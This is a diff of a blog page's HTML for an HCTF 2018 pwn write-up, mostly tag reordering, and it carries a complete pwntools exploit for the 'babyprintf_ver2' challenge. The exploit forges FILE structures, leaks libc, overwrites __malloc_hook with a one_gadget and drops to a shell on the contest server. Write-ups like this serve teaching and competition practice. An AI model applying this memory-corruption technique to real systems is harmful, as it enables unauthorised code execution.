@@ -10,7 +10,7 @@
   <title>hctf 2018 pwn writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="the_end程序自身的功能很简单：  提供libc地址（2.23） 关闭stdout和stderr 5次对所给地址修改1字节的机会">
-<meta name="keywords" content="ctf,pwn,2018,hctf">
+<meta name="keywords" content="ctf,pwn,hctf,2018">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hctf 2018 pwn writeup">
 <meta property="og:url" content="https://sunichi.github.io/2018/11/12/hctf2018/index.html">
@@ -196,29 +196,6 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    BIN_PATH = <span class="string">'./babyprintf_ver2'</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">            libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'150.109.44.250'</span>, <span class="number">20005</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Input your token:'</span>)</span><br><span class="line">        p.sendline(<span class="string">'8RMQq9PuDRurd91OVhADpDDK30eqjAqz'</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'buffer location to'</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">    bss_address = int(recv, <span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Have fun!\n'</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>) + p64(bss_address + <span class="number">0xf8</span>) * <span class="number">3</span></span><br><span class="line">    payload += p64(bss_address + <span class="number">0xf8</span>) + p64(bss_address + <span class="number">0x100</span>) + p64(bss_address + <span class="number">0x11d</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0xf8</span>) + p64(bss_address + <span class="number">0x11d</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'permitted!\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7ffff7dcc2a0</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) * <span class="number">7</span></span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    malloc_hook_addr = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) * <span class="number">6</span></span><br><span class="line">    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + <span class="number">0x8</span> + <span class="number">4</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.sendline(p64(libc.address + <span class="number">0x10a38c</span>)) <span class="comment"># one_gadget</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) * <span class="number">7</span></span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(<span class="string">'%49$p'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
 
       
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
     </div>
     <div class="article-info article-info-index">
       
@@ -236,11 +213,11 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2018</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2018</a>
         		</li>
       		
 		</ul>
@@ -347,7 +324,7 @@
 
 
   
-  
+
   
 
   
@@ -467,18 +444,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">xctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">2018</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">stack</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hctf</a>
               </li>
              
@@ -491,7 +456,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">2018</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">eis</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">xctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">stack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -515,15 +492,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">qwb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">pwnable-tw</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">qwb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">suctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tcache</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -532,10 +513,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">2015</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tcache</a>
               </li>
             
             <div class="clearfix"></div>
